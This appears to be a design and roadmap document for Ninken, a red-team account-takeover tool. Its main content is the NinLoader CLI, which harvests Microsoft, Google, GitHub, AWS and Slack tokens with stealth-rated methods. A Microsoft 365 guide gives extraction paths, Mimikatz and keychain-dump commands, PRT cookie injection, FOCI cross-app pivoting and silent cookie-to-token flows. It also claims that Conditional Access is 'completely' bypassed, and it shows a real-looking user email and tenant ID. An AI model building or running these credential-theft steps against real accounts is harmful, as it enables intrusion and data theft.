- **Shared Drives support**: Add "My Drive" vs "Shared Drives" toggle. Use `drive.drives.list()` to enumerate shared drives, then `drive.files.list({ driveId, corpora: "drive", includeItemsFromAllDrives: true, supportsAllDrives: true })` to list files within them.
- **List view improvements**: List view already exists via toggle button. Ensure parity with grid view for all actions (context menu, drag-drop, etc.).

### Buckets Auto-Discovery
- Replace manual Project ID input with auto-discovery using the GCP Resource Manager API (`cloudresourcemanager.projects.list`). Show a dropdown/searchable select of projects the user has access to. Requires adding `https://www.googleapis.com/auth/cloud-platform.read-only` scope to the token.

### Multi-Platform App Switcher
A Google-style 9-dot waffle menu in the header for switching between connected platforms without leaving the UI.

**Supported platforms (planned):**
- Google Workspace (Gmail, Drive, Buckets — already built)
- GitHub (Repos, Issues, PRs, Actions)
- Future: AWS, Azure, Slack, etc.

**UX model:**
- A grid/waffle icon in the header opens a panel showing all connected platforms
- Each platform shows its available services
- Clicking switches context (route + sidebar) without page reload
- Platform icons use each service's recognizable branding

### Multi-Platform Profiles
Profiles evolve from single-token to multi-token identity containers.

**Mental model:**
- **Profile** = "who am I" — a user identity with linked tokens per platform
- **App Switcher** = "what am I using" — platform/service navigation

**Architecture:**
- A profile holds multiple tokens: `{ profileId, name, tokens: { google: TokenData, github: TokenData, ... } }`
- If a GitHub token belongs to a different user than the Google token, the user creates a separate profile and links that token there
- Profile switcher stays in the header (existing), app switcher is a new separate control
- Auth cookie structure evolves from `TokenData[]` to `Profile[]` where each profile has a `platforms` map

**Token structure (v1.1):**
```typescript
type Profile = {
  id: string
  name: string           // user-chosen label
  avatarUrl?: string
  platforms: {
    google?: GoogleToken  // existing TokenData
    github?: GitHubToken  // PAT or OAuth token
    // future: aws, azure, slack...
  }
}
```

---

## NinLoader — Universal Token Collector CLI (v4.2)

### Overview

NinLoader is a standalone, service-agnostic CLI tool for automated token collection across all platforms Ninken supports. Available as Python (cross-platform: Windows, macOS, Linux) and PowerShell (Windows-native for environments where Python isn't available). It replaces per-service scripts like `reauth.py` and `reauth_microsoft.py` with a single, extensible tool.

**Key principle:** NinLoader is a **collector**, not an operator. It finds, extracts, and outputs tokens — Ninken does the rest.

### Design Goals

1. **Service-agnostic plugin architecture** — adding a new service means adding a collector plugin, zero core changes
2. **Granular control via arguments** — user selects exactly what to collect, from where, and how to output
3. **Multiple output modes** — save to file, print to stdout, pipe to clipboard, POST to running Ninken instance
4. **Zero external dependencies by default** — core works with stdlib; optional packages unlock advanced features
5. **OPSEC-aware** — minimal footprint, no telemetry, optional stealth modes for each collection method

### CLI Interface

```bash
# Basic usage — auto-detect and collect everything available
ninloader collect

# Collect specific service
ninloader collect --service microsoft
ninloader collect --service google
ninloader collect --service github
ninloader collect --service aws
ninloader collect --service slack

# Granular source selection
ninloader collect --service microsoft --source browser         # Chrome/Edge MSAL cache
ninloader collect --service microsoft --source keychain        # macOS Keychain / Windows DPAPI
ninloader collect --service microsoft --source teams-desktop   # Teams app local storage
ninloader collect --service microsoft --source device-code     # Interactive device code flow
ninloader collect --service microsoft --source all             # Try everything

ninloader collect --service google --source browser            # Chrome cookies/localStorage
ninloader collect --service google --source adc                # Application Default Credentials
ninloader collect --service google --source device-code        # OAuth device code flow
ninloader collect --service google --source gcloud-cli         # gcloud auth tokens

# Output control
ninloader collect --service microsoft --output file            # Save to ./tokens/microsoft_token.json (default)
ninloader collect --service microsoft --output stdout          # Print JSON to stdout
ninloader collect --service microsoft --output clipboard       # Copy to clipboard
ninloader collect --service microsoft --output ninken          # POST to running Ninken instance
ninloader collect --service microsoft --output file --path /custom/path/token.json

# Filtering
ninloader collect --service microsoft --account marcos.vinicius@netxar.com  # Specific account
ninloader collect --service microsoft --tenant 727ed07c-...                 # Specific tenant
ninloader collect --service microsoft --client teams                        # Specific FOCI client
ninloader collect --service google --scopes gmail.readonly,drive            # Specific scopes

# Auth flow options (for device-code / OAuth sources)
ninloader collect --service microsoft --source device-code --tenant netxar --client teams
ninloader collect --service google --source device-code --client-secret ./client_secret.json

# Discovery mode — show what's available without extracting
ninloader discover                                    # List all detected sessions/tokens
ninloader discover --service microsoft                # Microsoft-specific discovery
ninloader discover --json                             # Machine-readable output

# Validate existing tokens
ninloader validate --file ./tokens/microsoft_token.json
ninloader validate --file ./tokens/google_token.json

# Refresh expired tokens
ninloader refresh --file ./tokens/microsoft_token.json

# Multi-service batch collection
ninloader collect --service microsoft,google,github   # Collect all in one run

# Ninken integration
ninloader collect --service microsoft --output ninken --ninken-url http://localhost:4000
```

### PowerShell variant (Windows)

```powershell
# Same interface, native Windows
NinLoader.ps1 -Collect -Service Microsoft -Source Browser
NinLoader.ps1 -Collect -Service Microsoft -Source DeviceCode -Tenant "netxar"
NinLoader.ps1 -Discover
NinLoader.ps1 -Collect -Service Microsoft -Output Stdout | clip
NinLoader.ps1 -Collect -Service Microsoft -Source DPAPI    # Windows DPAPI token extraction
```

### Plugin Architecture

```
ninloader/
├── ninloader.py              # CLI entrypoint + arg parser
├── core/
│   ├── __init__.py
│   ├── output.py             # Output handlers (file, stdout, clipboard, ninken)
│   ├── discovery.py          # Token discovery engine
│   ├── validator.py          # Token validation (decode JWT, test API, check expiry)
│   └── refresh.py            # Token refresh logic
├── collectors/
│   ├── __init__.py           # Auto-discovers collector plugins
│   ├── base.py               # BaseCollector abstract class
│   ├── microsoft.py          # Microsoft 365 collector
│   │   ├── browser.py        # Chrome/Edge MSAL cache extraction
│   │   ├── keychain.py       # macOS Keychain / Windows DPAPI
│   │   ├── teams_desktop.py  # Teams desktop app tokens
│   │   ├── device_code.py    # Device code flow (interactive)
│   │   └── __init__.py       # Registers all Microsoft sources
│   ├── google.py             # Google Workspace collector
│   │   ├── browser.py        # Chrome cookies/localStorage
│   │   ├── adc.py            # Application Default Credentials
│   │   ├── gcloud.py         # gcloud CLI token cache
│   │   ├── device_code.py    # OAuth device code flow
│   │   └── __init__.py
│   ├── github.py             # GitHub collector
│   │   ├── gh_cli.py         # gh CLI config (~/.config/gh/hosts.yml)
│   │   ├── git_credentials.py # git credential store/cache
│   │   └── __init__.py
│   ├── aws.py                # AWS collector
│   │   ├── credentials.py    # ~/.aws/credentials
│   │   ├── sso_cache.py      # ~/.aws/sso/cache
│   │   └── __init__.py
│   └── slack.py              # Slack collector
│       ├── desktop.py        # Slack desktop app tokens
│       ├── browser.py        # Browser localStorage
│       └── __init__.py
└── NinLoader.ps1             # PowerShell variant (standalone, no Python needed)
```

### BaseCollector Interface

```python
class BaseCollector(ABC):
    """Every collector plugin implements this interface."""

    service: str              # "microsoft", "google", "github", etc.
    source: str               # "browser", "keychain", "device-code", etc.
    platforms: list[str]      # ["windows", "macos", "linux"]
    requires: list[str]       # Optional pip packages needed (e.g., ["msal"])
    stealth_score: int        # 1-5, how noisy this extraction method is

    @abstractmethod
    def discover(self) -> list[DiscoveredToken]:
        """Find available tokens without extracting. Returns metadata only."""

    @abstractmethod
    def collect(self, **kwargs) -> list[CollectedToken]:
        """Extract tokens. kwargs from CLI args (account, tenant, scopes, etc.)."""

    @abstractmethod
    def validate(self, token: CollectedToken) -> ValidationResult:
        """Test if a token is valid and what it can access."""

    @abstractmethod
    def refresh(self, token: CollectedToken) -> CollectedToken:
        """Refresh an expired token using its refresh_token."""
```

### Token Output Format (universal)

```json
{
  "ninloader_version": "1.0",
  "collected_at": "2026-03-19T09:43:08Z",
  "collector": {
    "service": "microsoft",
    "source": "device-code",
    "stealth_score": 5
  },
  "account": {
    "id": "5825f3c9-a793-4865-9db6-8848e6e4d435",
    "username": "marcos.vinicius@netxar.com",
    "display_name": "Marcos Vinicius",
    "tenant_id": "727ed07c-9710-40a6-a319-23c26eb256eb",
    "tenant_name": "Netxar Technnologies"
  },
  "token": {
    "platform": "microsoft",
    "access_token": "eyJ...",
    "refresh_token": "0.AVY...",
    "client_id": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
    "token_uri": "https://login.microsoftonline.com/.../oauth2/v2.0/token",
    "scopes": ["Mail.ReadWrite", "Files.ReadWrite.All", "..."],
    "expires_at": "2026-03-19T10:43:08Z",
    "foci": true
  }
}
```

This format is directly ingestable by Ninken's auth endpoint — `ninloader collect --output ninken` POSTs this to `/api/auth`.

### Collection Sources per Service

| Service | Source | OS | Method | Stealth |
|---------|--------|----|--------|:-------:|
| **Microsoft** | `browser` | All | Chrome/Edge MSAL localStorage | 5/5 |
| | `keychain` | macOS | Keychain `com.microsoft.oneauth.*` | 4/5 |
| | `dpapi` | Windows | TokenBroker cache DPAPI decrypt | 4/5 |
| | `teams-desktop` | All | Teams SQLite/LevelDB | 5/5 |
| | `device-code` | All | Interactive device code flow | 3/5 |
| **Google** | `browser` | All | Chrome cookies + localStorage | 5/5 |
| | `adc` | All | `~/.config/gcloud/application_default_credentials.json` | 5/5 |
| | `gcloud` | All | `~/.config/gcloud/credentials.db` | 5/5 |
| | `device-code` | All | OAuth installed app flow | 3/5 |
| **GitHub** | `gh-cli` | All | `~/.config/gh/hosts.yml` | 5/5 |
| | `git-credentials` | All | git credential store/cache | 5/5 |
| | `browser` | All | GitHub session cookies | 5/5 |
| **AWS** | `credentials` | All | `~/.aws/credentials` | 5/5 |
| | `sso-cache` | All | `~/.aws/sso/cache/*.json` | 5/5 |
| | `env` | All | `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` env vars | 5/5 |
| **Slack** | `desktop` | All | Slack app local storage | 5/5 |
| | `browser` | All | Slack web session cookies | 5/5 |

### Dependencies

**Core (stdlib only, zero-install):**
- File system token extraction (ADC, gcloud, AWS credentials, gh CLI, git credentials)
- JSON output, discovery, basic validation

**Optional (pip install for advanced features):**
| Package | When needed |
|---------|-------------|
| `msal` | Microsoft device code flow, token refresh |
| `google-auth-oauthlib` | Google device code flow |
| `cryptography` | DPAPI decryption (Windows), Keychain decryption (macOS) |
| `pysqlite3` | Teams desktop SQLite extraction |
| `requests` | `--output ninken` (POST to Ninken instance) |

NinLoader detects missing optional packages and warns gracefully:
```
[!] Source 'device-code' requires 'msal'. Install: pip install msal
    Skipping Microsoft device-code collection. Other sources will proceed.
```

### Relationship to Ninken

- NinLoader is a **standalone tool** — works without Ninken running
- NinLoader outputs tokens in Ninken-compatible format
- `--output ninken` directly loads tokens into a running Ninken instance
- NinLoader replaces `reauth.py` and `reauth_microsoft.py` with one unified tool
- NinLoader can be distributed as a single `.py` file or as a pip package

### PowerShell Implementation Notes

The PowerShell variant (`NinLoader.ps1`) is a single-file script for Windows environments where Python may not be available. It covers:
- Windows DPAPI token extraction (TokenBroker cache, Teams, Edge/Chrome cookies)
- Windows Credential Manager (`vaultcmd` / `cmdkey`)
- AWS/GitHub/Slack file-based extraction
- Device code flows via native `Invoke-RestMethod`
- No external module dependencies

---

## Microsoft 365 Integration — Full Roadmap

### Why Graph API

Microsoft Graph (`https://graph.microsoft.com/v1.0/`) is the single unified API for all Microsoft 365 services. Unlike Google which has separate APIs per service (Gmail API, Drive API, Calendar API, Admin SDK), Microsoft exposes everything through one endpoint with one token. This is a strategic advantage for red teamers: **one token, one API, total access** — and because all access is API-side, it completely bypasses browser-level fingerprinting, behavioral ML detections, and Conditional Access policies that only evaluate browser sessions.

### Token Types Valid for Graph API

Not all Microsoft tokens are equal. Here is a complete breakdown of what tokens exist, which ones work with Graph API, and what access they provide.

#### 1. OAuth2 Access Token (JWT)

| Property | Value |
|----------|-------|
| **Format** | JWT (`eyJ...`), typically 1000-2000 chars |
| **Lifetime** | 60-90 minutes (default), configurable by tenant |
| **Works with Graph API** | Yes — this is the primary Graph API credential |
| **How to use** | `Authorization: Bearer <access_token>` header |
| **Scope** | Determined at token issuance — cannot escalate after the fact |
| **Limitations** | Short-lived, must be refreshed constantly |

**Access depends on the scopes granted at auth time:**

| Scope | Graph API Access |
|-------|-----------------|
| `Mail.Read` / `Mail.ReadWrite` | Read/send email via `/me/messages` |
| `Files.Read` / `Files.ReadWrite` | OneDrive files via `/me/drive/root/children` |
| `Calendars.Read` / `Calendars.ReadWrite` | Calendar events via `/me/calendar/events` |
| `User.Read` | Own profile via `/me` |
| `User.Read.All` | All directory users via `/users` (requires admin consent) |
| `Group.Read.All` | All groups via `/groups` |
| `Directory.Read.All` | Full directory enumeration |
| `Sites.Read.All` | SharePoint sites via `/sites` |
| `Chat.Read` | Teams messages via `/me/chats` |
| `TeamSettings.Read.All` | Teams config via `/teams` |
| `RoleManagement.Read.All` | Entra ID roles via `/directoryRoles` |
| `Application.Read.All` | App registrations via `/applications` |

#### 2. OAuth2 Refresh Token

| Property | Value |
|----------|-------|
| **Format** | Opaque string, starts with `0.AVY...` or `0.AQ8...` or `0.ARo...`, typically 1000+ chars |
| **Lifetime** | 90 days (default rolling), refreshes on use. Can be "infinite" if used before expiry |
| **Works with Graph API** | Indirectly — exchange for access token at `/oauth2/v2.0/token`, then use access token |
| **How to use** | POST to token endpoint with `grant_type=refresh_token` |
| **This is the Ninken equivalent of Google's refresh_token** | Yes — same perpetual access pattern |
| **Revocation** | Admin revokes via Entra ID, user changes password (if "revoke on password change" is enabled), or Conditional Access policy triggers |

**Token exchange request:**
```
POST https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token
Content-Type: application/x-www-form-urlencoded

client_id={client_id}
&grant_type=refresh_token
&refresh_token={refresh_token}
&scope=https://graph.microsoft.com/.default
```

**Ninken token.json equivalent:**
```json
{
  "refresh_token": "0.AVYAxxxxxxxxxx...",
  "client_id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "client_secret": "~xxxxxxxxxxxxxxxxxx",
  "tenant_id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

Note: `client_secret` is only needed for **confidential** (server-side) apps. Many first-party Microsoft apps (Teams, Outlook desktop, etc.) are **public clients** — they issue refresh tokens with just a `client_id` and no secret. This is common in red team scenarios where tokens are extracted from desktop apps.

#### 3. Primary Refresh Token (PRT)

| Property | Value |
|----------|-------|
| **Format** | Opaque blob, bound to device + user. Not a JWT |
| **Lifetime** | 14 days, rolling (renewed on each use). Persists across reboots |
| **Works with Graph API** | Indirectly — PRT → refresh token → access token. Or PRT cookie → browser SSO → intercept access token |
| **How to use** | Exchange via Azure AD CloudAP plugin, or inject `x-ms-RefreshTokenCredential` cookie into browser |
| **Access level** | SSO to ALL Microsoft 365 services the user has access to — it's the master key |
| **Protection** | TPM-bound on modern devices, DPAPI-protected on older/non-TPM devices |

**PRT → Graph API path (two methods):**

Method A — Token exchange (non-TPM devices):
```
1. Extract PRT + session key from device
2. Use ROADtoken or AADInternals to derive a refresh token
3. Exchange refresh token → access token (same as flow #2 above)
4. Use access token with Graph API
```

Method B — Browser cookie injection (any device):
```
1. Obtain PRT cookie value (x-ms-RefreshTokenCredential)
2. Inject into browser at login.microsoftonline.com
3. Browser gets SSO, intercept the access token from network traffic
4. Use access token with Graph API
```

#### 4. Browser Session Cookies (login.microsoftonline.com)

| Cookie | Purpose | Works with Graph API | Notes |
|--------|---------|---------------------|-------|
| `ESTSAUTH` | Session cookie, 24h lifetime | No — only works at login.microsoftonline.com for browser SSO | Can be used to obtain new access tokens by navigating to auth endpoints |
| `ESTSAUTHPERSISTENT` | Persistent session, 90 days | No — same as above, browser-only | Survives browser restart. Most valuable browser cookie |
| `ESTSAUTHLIGHT` | Lightweight session hint | No | Used for "keep me signed in" prompt |
| `x-ms-RefreshTokenCredential` | PRT-derived, injected by CloudAP | No — but triggers SSO that yields access tokens | This IS the PRT cookie. Most powerful browser artifact |
| `SignInStateCookie` | Device registration state | No | Indicates AAD-joined device |
| `CCState` | Cloud Clip state (authentication) | No | Device auth flow state |

**How to go from browser cookies to Graph API access:**

```
1. Extract ESTSAUTHPERSISTENT from browser cookie store
2. Use it to navigate to:
   https://login.microsoftonline.com/common/oauth2/v2.0/authorize
   ?client_id={known_app_id}
   &response_type=token
   &scope=https://graph.microsoft.com/.default
   &redirect_uri={matching_redirect}
   &prompt=none
3. The cookie provides SSO — no password needed
4. Intercept the access_token from the redirect URL fragment
5. Use access_token with Graph API
```

Well-known client IDs for this flow:
| App | Client ID | Notes |
|-----|-----------|-------|
| Microsoft Office | `d3590ed6-52b3-4102-aeff-aad2292ab01c` | Broad scopes, widely consented |
| Microsoft Teams | `1fec8e78-bce4-4aaf-ab1b-5451cc387264` | Chat, calendar, files |
| Azure Portal | `c44b4083-3bb0-49c1-b47d-974e53cbdf3c` | Directory, management |
| Microsoft Graph Explorer | `de8bc8b5-d9f9-48b1-a8ad-b748da725064` | Explicit Graph scopes |
| Outlook Mobile | `27922004-5251-4030-b22d-91ecd9a37ea4` | Mail, calendar |

#### 5. FOCI (Family of Client IDs) Tokens

| Property | Value |
|----------|-------|
| **What** | Microsoft's first-party apps share a token family — a refresh token from one FOCI app can get access tokens for ANY other FOCI app |
| **Why it matters** | Extract a Teams refresh token → exchange it for Outlook, OneDrive, SharePoint, Azure Portal access |
| **Works with Graph API** | Yes — exchange FOCI refresh token with a different client_id to get Graph-scoped access tokens |

**FOCI family members (partial list):**
- Microsoft Teams (`1fec8e78-bce4-4aaf-ab1b-5451cc387264`)
- Microsoft Office (`d3590ed6-52b3-4102-aeff-aad2292ab01c`)
- Outlook Mobile (`27922004-5251-4030-b22d-91ecd9a37ea4`)
- OneDrive (`ab9b8c07-8f02-4f72-87fa-80105867a763`)
- Azure Portal (`c44b4083-3bb0-49c1-b47d-974e53cbdf3c`)
- SharePoint (`08e18876-6177-487e-b8b5-cf950c1e598c`)

**FOCI exchange:**
```
POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token
client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c   ← different FOCI app
grant_type=refresh_token
refresh_token={token_from_teams}                   ← token from original app
scope=https://graph.microsoft.com/.default
```

This is a critical red team technique: you only need ONE refresh token from ANY FOCI app to pivot across the entire M365 suite.

### Token Extraction — Where, How, When

#### Windows

| Source | Token Type | Protection | Extraction Method | Tools |
|--------|-----------|------------|-------------------|-------|
| `%LOCALAPPDATA%\Microsoft\TokenBroker\Cache\*.tbres` | Refresh tokens (WAM-managed) | DPAPI (user context) | Parse .tbres files → DPAPI decrypt with user key | ROADtoken, AADInternals, SharpLAPS |
| `lsass.exe` process memory | PRT + session key | Process protection (PPL on newer Windows) | Mimikatz `sekurlsa::cloudap` — requires SYSTEM | Mimikatz, pypykatz |
| `%LOCALAPPDATA%\Packages\Microsoft.AAD.BrokerPlugin_*\AC\TokenBroker\Cache\` | Refresh tokens (UWP broker) | DPAPI | Same as TokenBroker cache, different path for UWP apps | ROADtoken |
| `%LOCALAPPDATA%\Microsoft\Teams\Cookies` | Access/refresh tokens | SQLite, often plaintext | Parse SQLite DB, extract token values | Manual SQLite query, TeamFiltration |
| `%APPDATA%\Microsoft\Teams\Local Storage\leveldb\` | Session tokens, refresh tokens | LevelDB, plaintext | Parse LevelDB .log and .ldb files for `accessToken`, `refreshToken` keys | TeamFiltration, manual parsing |
| `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies` | ESTSAUTH, ESTSAUTHPERSISTENT | DPAPI (Chrome cookie encryption) | Decrypt with DPAPI user key or use `CookieDecryptor` | SharpChromium, HackBrowserData |
| `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies` | Same as above (if user uses Chrome for M365) | DPAPI | Same approach | SharpChromium, HackBrowserData |
| `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb\` | Access tokens from web apps (Outlook Web, SharePoint) | Plaintext | Parse LevelDB for `oidc.` / `msal.` cache entries | Manual parsing |
| `%LOCALAPPDATA%\Microsoft\Credentials\*` | Cached credentials, managed identity tokens | Credential Manager (DPAPI) | `vaultcmd /listcreds`, Mimikatz `vault::cred` | Mimikatz, SharpDPAPI |
| Registry: `HKCU\Software\Microsoft\Office\16.0\Common\Identity\Identities\*` | Office token cache metadata | Registry (accessible to user) | Points to TokenBroker cache entries | reg query |
| `%LOCALAPPDATA%\Microsoft\OneAuth\accounts\*` | OneAuth token cache (newer Office apps) | DPAPI | Parse account JSON + decrypt tokens | Manual, ROADtoken |

**When available:** Tokens exist as long as the user has signed into any M365 app. TokenBroker cache persists across reboots. Teams tokens persist until sign-out. Browser cookies persist based on session settings ("Keep me signed in" = ESTSAUTHPERSISTENT lasts 90 days).

#### macOS

| Source | Token Type | Protection | Extraction Method |
|--------|-----------|------------|-------------------|
| Keychain: `com.microsoft.identity.broker` | Refresh tokens (MS broker) | Keychain ACL (app-specific) | `security find-generic-password -s "com.microsoft.identity.broker"` — requires user password or TCC bypass |
| Keychain: `com.microsoft.adalcache` | ADAL token cache (legacy Office) | Keychain | Same approach, legacy apps still use ADAL |
| Keychain: `com.microsoft.identity.universalstorage` | MSAL token cache (modern apps) | Keychain | `security dump-keychain` with user auth |
| `~/Library/Group Containers/UBF8T346G9.com.microsoft.identity/accounts/*` | Account metadata + tokens | File permissions | Direct file read if running as user |
| `~/Library/Application Support/Microsoft/Teams/Cookies` | Teams tokens | SQLite | Same as Windows Teams extraction |
| `~/Library/Application Support/Microsoft Edge/Default/Cookies` | Browser session cookies | Keychain-protected encryption key | Decrypt with Chrome Safe Storage key from Keychain |
| `~/Library/Cookies/Cookies.binarycookies` | Safari cookies for microsoftonline.com | Binary plist | Parse with `BinaryCookieReader` |

**When available:** Keychain entries persist until explicitly removed or password change. Teams tokens persist like Windows.

#### Linux

| Source | Token Type | Protection | Extraction Method |
|--------|-----------|------------|-------------------|
| `~/.config/microsoft-identity-broker/` | Refresh tokens (if MS broker installed) | File permissions | Direct file read |
| `~/.local/share/keyrings/` | Tokens stored via GNOME Keyring / KWallet | Keyring encryption (unlocked on login) | `secret-tool` or keyring API |
| `~/.config/Microsoft/Microsoft Teams/Cookies` | Teams tokens | SQLite | Same parsing as other platforms |
| `~/.config/google-chrome/Default/Cookies` | Browser cookies (if using Chrome for M365) | OS keyring | Decrypt with keyring-stored key |
| `~/.azure/msal_token_cache.json` | Azure CLI MSAL cache | Plaintext JSON | Direct file read — contains refresh tokens in cleartext |
| `~/.azure/accessTokens.json` | Azure CLI legacy token cache | Plaintext JSON | Direct file read — deprecated but still present on some systems |

**Critical note:** `~/.azure/msal_token_cache.json` is the easiest extraction target on any platform. If Azure CLI is installed and the user has run `az login`, this file contains refresh tokens in plaintext. Works on Windows (`%USERPROFILE%\.azure\`), macOS, and Linux.

#### Mobile / Other

| Source | Token Type | Notes |
|--------|-----------|-------|
| iOS Keychain | Refresh tokens (Authenticator, Outlook, Teams) | Requires jailbreak or MDM-managed backup extraction |
| Android Keystore | Refresh tokens | Requires root or `adb backup` exploitation |
| Intune-managed device token | Device compliance token | Can be used to satisfy Conditional Access device checks |

### Token Validity Matrix — What Works Where

| Token Type | Graph API | Browser SSO | Lifetime | Renewability | Red Team Value |
|-----------|-----------|-------------|----------|--------------|----------------|
| **Access Token (JWT)** | Direct | No | 60-90 min | Must refresh | Low — expires fast |
| **Refresh Token (OAuth2)** | Via exchange | No | 90 days rolling | Self-renewing on use | **High — Ninken primary input** |
| **PRT** | Via chain (PRT → RT → AT) | Via cookie injection | 14 days rolling | Self-renewing | **Highest — master key** |
| **ESTSAUTHPERSISTENT** | Via auth flow → AT | Yes | 90 days | Not renewable, fixed expiry | **High — browser pivot** |
| **ESTSAUTH** | Via auth flow → AT | Yes | 24 hours | Not renewable | Medium — short window |
| **FOCI Refresh Token** | Via cross-app exchange | No | 90 days rolling | Self-renewing + cross-app | **Highest — one token, all apps** |
| **Azure CLI cache** | Via exchange | No | 90 days rolling | Self-renewing | **High — easiest to extract** |

### Microsoft 365 Integration — Implementation Phases

#### Phase 1: OAuth2 Refresh Token Flow (v2.0) — IMPLEMENTED

Implemented as a FOCI public client flow (no client_secret required). Uses direct token exchange with Microsoft's OAuth2 endpoint instead of MSAL SDK.

**Auth input (token.json for M365):**
```json
{
  "platform": "microsoft",
  "refresh_token": "0.AVYAxxxxxxxxxx...",
  "client_id": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
  "tenant_id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

Note: `client_secret` is NOT required — Microsoft FOCI public clients (Teams, Office, etc.) issue refresh tokens without a secret. This is the standard red team scenario where tokens are extracted from desktop apps.

**SDK:** No SDK — direct `fetch()` to Microsoft OAuth2 token endpoint and Graph API. Token exchange, JWT decoding, OData sanitization, and paginated fetching are all implemented in `src/lib/microsoft.ts`.

**Key implementation files:**
- `src/lib/microsoft.ts` — Graph API client (graphFetch, graphJson, graphPaginated, JWT decode without external deps, OData query sanitization, in-memory access token cache)
- `src/lib/providers/microsoft.ts` — Full ServiceProvider implementation (validate, refresh, getProfile, getSidebarItems, defaultRoute)
- `src/hooks/use-outlook.ts`, `use-onedrive.ts`, `use-teams.ts`, `use-entra.ts`, `use-m365-audit.ts` — React data-fetching hooks

**Graph API endpoints implemented:**

| Service | Graph Endpoint | Ninken UI View |
|---------|---------------|----------------|
| **Outlook (Mail)** | `GET /me/messages`, `GET /me/messages/{id}`, `GET /me/messages/{id}/attachments`, `GET /me/mailFolders`, `POST /me/sendMail`, etc. | 3-panel email browser (folder list, message list, message detail) |
| **OneDrive** | `GET /me/drive/root/children`, `GET /me/drive/items/{id}/children`, `GET /me/drive/items/{id}/content`, search | File browser with breadcrumbs, download, file type icons |
| **Teams** | `GET /me/joinedTeams`, `GET /teams/{id}/channels`, `GET /teams/{id}/channels/{id}/messages` | 3-column layout (teams, channels, messages) |
| **Entra ID (Directory)** | `GET /users`, `GET /groups`, `GET /directoryRoles`, `GET /groups/{id}/members`, `GET /directoryRoles/{id}/members` | Tabbed view (Users, Groups, Roles) with member expansion |
| **M365 Audit** | `GET /auditLogs/signIns` + client-side aggregation | Dashboard with 4 sub-pages (Sign-ins, Apps, Risky Users, Conditional Access) |

**API routes structure (implemented):**
```
src/app/api/microsoft/
  outlook/
    messages/route.ts              # GET list messages
    messages/[id]/route.ts         # GET read message
    messages/[id]/attachments/route.ts         # GET list attachments
    messages/[id]/attachments/[aid]/route.ts   # GET download attachment
    folders/route.ts               # GET mail folders
    send/route.ts                  # POST send mail
    profile/route.ts               # GET user profile
  onedrive/
    files/route.ts                 # GET list root files
    files/[id]/route.ts            # GET file info
    files/[id]/children/route.ts   # GET folder contents
    files/[id]/content/route.ts    # GET download file
    search/route.ts                # GET search files
  teams/
    teams/route.ts                 # GET joined teams
    teams/[id]/channels/route.ts   # GET channels
    teams/[id]/channels/[cid]/messages/route.ts  # GET channel messages
  entra/
    users/route.ts                 # GET list users
    users/[id]/route.ts            # GET user details
    groups/route.ts                # GET list groups
    groups/[id]/members/route.ts   # GET group members
    roles/route.ts                 # GET directory roles + members
  audit/
    route.ts                       # GET audit logs (sign-ins, aggregations)
```

**UI pages (implemented):**
```
src/app/(microsoft)/
  outlook/page.tsx                 # 3-panel Outlook email view
  onedrive/page.tsx                # OneDrive file browser
  teams/page.tsx                   # 3-column Teams view
  entra/page.tsx                   # Tabbed Entra ID directory
  m365-audit/page.tsx              # M365 Audit dashboard
  m365-audit/sign-ins/page.tsx     # Sign-in log details
  m365-audit/apps/page.tsx         # App registration analysis
  m365-audit/risky-users/page.tsx  # Risky users view
  m365-audit/conditional-access/page.tsx  # Conditional Access analysis
  layout.tsx                       # Microsoft route group layout with sidebar
```

**Service switching flow:**
1. Profile dropdown shows active account (service icon + email)
2. "Add new service" option redirects to `/?add=true` (landing page with service grid)
3. Landing page shows service cards (Google, Microsoft) — user selects and uploads credentials
4. Back button returns to previous service view
5. Switching profiles redirects to that provider's `defaultRoute` (e.g., `/outlook` for Microsoft, `/gmail` for Google)

**Cookie size fix:** Microsoft refresh tokens are ~1500 chars (vs Google's ~70). The activate route strips credentials to essential fields only (`refresh_token`, `client_id`, `tenant_id`, `platform`) to stay within cookie limits.

#### Phase 2: PRT & Advanced Token Flows (v4.1) — Planned

**PRT input (extracted from non-TPM device):**
```json
{
  "platform": "microsoft",
  "token_type": "prt",
  "prt": "extracted-prt-value...",
  "session_key": "derived-session-key...",
  "tenant_id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

**PRT cookie input (from any device):**
```json
{
  "platform": "microsoft",
  "token_type": "prt_cookie",
  "prt_cookie": "x-ms-RefreshTokenCredential-value...",
  "tenant_id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

**Browser session cookie input:**
```json
{
  "platform": "microsoft",
  "token_type": "browser_session",
  "estsauthpersistent": "cookie-value...",
  "tenant_id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

**FOCI token input:**
```json
{
  "platform": "microsoft",
  "token_type": "foci",
  "refresh_token": "0.AVYAxxxxxxxxxx...",
  "source_client_id": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
  "tenant_id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

Ninken handles the exchange chain internally — the user drops in whatever they have, Ninken converts it to a Graph API access token.

**Token exchange chain:**
```
PRT → (CloudAP exchange) → Refresh Token → Access Token → Graph API
PRT Cookie → (browser SSO flow) → Access Token → Graph API
ESTSAUTHPERSISTENT → (silent auth flow) → Access Token → Graph API
FOCI RT → (cross-client exchange) → Access Token → Graph API
Refresh Token → (standard exchange) → Access Token → Graph API
```

#### Phase 3: Studio Module — Token Intelligence Hub (v4.3)

A new top-level mode in the Ninken mode switcher (alongside Operate and Audit) that serves as the red teamer's reference and toolkit for understanding tokens, services, extraction techniques, and access mapping.

**Mode switcher update:**
```
[ Operate ] [ Audit ] [ Studio ]
```

